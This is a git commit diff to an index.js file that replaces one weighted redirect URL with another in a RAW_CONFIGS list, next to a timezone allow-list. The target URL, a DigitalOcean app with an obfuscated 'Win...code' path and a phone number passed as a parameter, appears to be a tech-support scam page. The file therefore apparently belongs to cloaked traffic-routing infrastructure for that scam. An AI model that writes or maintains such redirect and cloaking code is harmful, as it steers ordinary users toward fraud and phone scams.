250b742858c7fbecbb40708f8feb8f40eee519d0
paalakash <palaksh452@gmail.com>
2026-06-17 09:00:53 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://morning-app-dw8h8.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-1266", weight: 1.0 }
+    { url: "https://octopus-app-8wuqv.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-866-315-1266", weight: 1.0 }
 
 ];
 
